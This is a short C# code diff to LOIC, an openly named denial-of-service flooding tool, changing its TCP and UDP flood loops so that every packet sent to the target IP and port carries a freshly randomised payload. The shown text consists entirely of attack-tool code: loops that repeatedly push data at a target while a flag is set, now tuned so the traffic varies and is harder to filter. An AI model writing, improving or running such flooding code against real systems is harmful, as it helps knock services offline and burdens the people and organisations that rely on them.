@@ -39,7 +39,7 @@ namespace LOIC
 		{
 			try
 			{
-				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, ( random ? new Functions().RandomString() : null ) ));
+				byte[] buf;
 				IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
@@ -58,6 +58,7 @@ namespace LOIC
 							while (IsFlooding)
 							{
 								FloodCount++;
+								buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, ( random ? new Functions().RandomString() : null ) ));
 								socket.Send(buf);
 								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
 							}
@@ -73,6 +74,7 @@ namespace LOIC
 							while (IsFlooding)
 							{
 								FloodCount++;
+								buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, ( random ? new Functions().RandomString() : null ) ));
 								socket.SendTo(buf, SocketFlags.None, RHost);
 								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
 							}
